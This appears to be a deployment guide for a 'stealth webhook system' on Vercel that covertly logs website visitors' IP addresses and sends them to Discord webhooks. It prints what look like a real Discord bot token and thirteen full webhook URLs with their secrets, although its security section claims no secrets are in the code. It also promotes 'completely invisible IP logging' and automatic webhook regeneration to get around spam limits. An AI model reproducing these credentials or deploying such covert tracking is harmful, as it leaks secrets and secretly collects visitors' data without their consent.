# 🚀 Vercel Deployment Guide

## Environment Variables Setup

### 1. Go to Vercel Dashboard
1. Navigate to your project in the Vercel dashboard
2. Click on "Settings" tab
3. Click on "Environment Variables" in the left sidebar

### 2. Add Environment Variables
Add these environment variables in Vercel:

| Name | Value | Environment |
|------|-------|-------------|
| `DISCORD_BOT_TOKEN` | `MTM5MzYzMzc0Mzc5NjY5OTEzNg.GNXETy.tKy8xRHWGYqAkYnuniw2FxXPjegZdh3plC4Z_U` | Production |
| `DISCORD_CHANNEL_ID` | `1393371863542923368` | Production |
| `WEBSITE_NAME` | `slice.lol` | Production |
| `WEBHOOK_COUNT` | `13` | Production |

### 3. Add Webhook URLs
Add these webhook URL environment variables:

| Name | Value | Environment |
|------|-------|-------------|
| `WEBHOOK_URL_1` | `https://discord.com/api/webhooks/1395900214824665098/cn3U16abUx054ptKaxUkhwjPCYotOJeZBuAer6GVWrItAAzNj20kl0U4QU83k4KWgI6c` | Production |
| `WEBHOOK_URL_2` | `https://discord.com/api/webhooks/1395900221535293501/Zx1OSNZbDbw89LBDOKIh8k3nd9Gz1UffCyTbDOD2AWirGw3Llfws2s9YAYSkBzkegT5s` | Production |
| `WEBHOOK_URL_3` | `https://discord.com/api/webhooks/1395900224269975673/tQOnh6Nn5K4nnszcROgZE5hYZ-vJafzpl5gOZT0UePqr8iRL0u3OUF1LNHauEvYCd3ZX` | Production |
| `WEBHOOK_URL_4` | `https://discord.com/api/webhooks/1395900224932679792/7x6SLnMHQYMbPwTOjZvKEhJ10Yxe4sPtjrqwHSAwkGkxrwvRcNCx15ol7ncdr-Pn0pJD` | Production |
| `WEBHOOK_URL_5` | `https://discord.com/api/webhooks/1395900225708757023/ttlF6gTYzoW3LHmZA4gj1Ga8iDzBNNF7khkC4LoTexI9N_zgS5g3aq1jCluxX0S3OPV4` | Production |
| `WEBHOOK_URL_6` | `https://discord.com/api/webhooks/1395900318373380286/fhFGkzASiCvIDfgZ7Nzt9AsDHTS8V5rmLjRSdXJvWSY4qrS6kjbmwSiM56luZXv2BMmk` | Production |
| `WEBHOOK_URL_7` | `https://discord.com/api/webhooks/1395900319761694780/lCKzyqhjEHfux5IiBRV7sBecbPajysh46hUOq2ZPA5j50wlg9eLKmKJ5v-3s9EZCrFma` | Production |
| `WEBHOOK_URL_8` | `https://discord.com/api/webhooks/1395900320546296009/RoS0EJasyQOD_nCjXeHovw3gxoIiaXIJJHVkd8dC3wFVwM_Q-s9XBA-Thq8NjqRtXZ3O` | Production |
| `WEBHOOK_URL_9` | `https://discord.com/api/webhooks/1395900321062191184/YaOUaGjjBeBNDD6iyMNQm6Kb-agPEaUglSlTYXiJ9GidohuBexkSXealWlDHlTH1aWQa` | Production |
| `WEBHOOK_URL_10` | `https://discord.com/api/webhooks/1395900322714746923/K7wdKJ32gJI7MGaMzTj7kCUN0vA9LL7Q8VpHqwo3VhNdm8x4skmVVtSadQDAKPc0S0SU` | Production |
| `WEBHOOK_URL_11` | `https://discord.com/api/webhooks/1395900323662397480/Epl1syFjkaRXEwBUROgvpy_bwiWIgSoPpAn0XLmE7jjV6lWKJS6pCOK5xi-xiKeyEUzE` | Production |
| `WEBHOOK_URL_12` | `https://discord.com/api/webhooks/1395900323838824600/eHSSsiDKuYYAsYSytTWb7KHZMIuIiLJviLSvR6P4euhbOsF6EFQU6qgFACD90_HynA_O` | Production |
| `WEBHOOK_URL_13` | `https://discord.com/api/webhooks/1395900325499502633/TpP0vKV1uHLRpPcVcZzqhjhlHsmDAIHxPav4EHUHzN3YzQZ9ZSIEiq2RPOZmVMgAYu2V` | Production |

### 4. Deploy
1. Push your code to GitHub
2. Vercel will automatically deploy
3. The system will use Vercel's environment variables

## 🔧 Configuration Details

### Environment Variables
- **DISCORD_BOT_TOKEN**: Your Discord bot token
- **DISCORD_CHANNEL_ID**: Your Discord channel ID
- **WEBSITE_NAME**: Your website name (optional, auto-detected)

### Vercel Configuration
- **Runtime**: Node.js
- **Entry Point**: `server.js`
- **Build Command**: `npm run build`
- **Output Directory**: `dist`

## 🎯 Features in Production

### Automatic Detection
- Website URL is automatically detected from request headers
- No hardcoded website names
- Dynamic webhook naming

### Stealth Operation
- Completely invisible IP logging
- No UI elements showing webhook functionality
- Silent background operation

### Anti-Spam Protection
- 10 messages/second threshold
- Automatic webhook regeneration
- Discord bot integration

## 📊 Monitoring

### Health Check
Visit: `https://your-domain.vercel.app/api/webhook/health`

### Webhook Status
Visit: `https://your-domain.vercel.app/api/webhook/status`

## 🔒 Security

- Environment variables are encrypted in Vercel
- No secrets in code
- Automatic HTTPS
- Global CDN

## 🚨 Troubleshooting

### Bot Not Connecting
- Check environment variables in Vercel dashboard
- Verify bot token is correct
- Check Discord API status

### Webhooks Not Working
- Validate webhook URLs
- Check Discord channel permissions
- Monitor spam detection settings

### Deployment Issues
- Check Vercel build logs
- Verify `vercel.json` configuration
- Ensure all dependencies are in `package.json`

---

**Your stealth webhook system is now ready for production deployment on Vercel! 🎯** 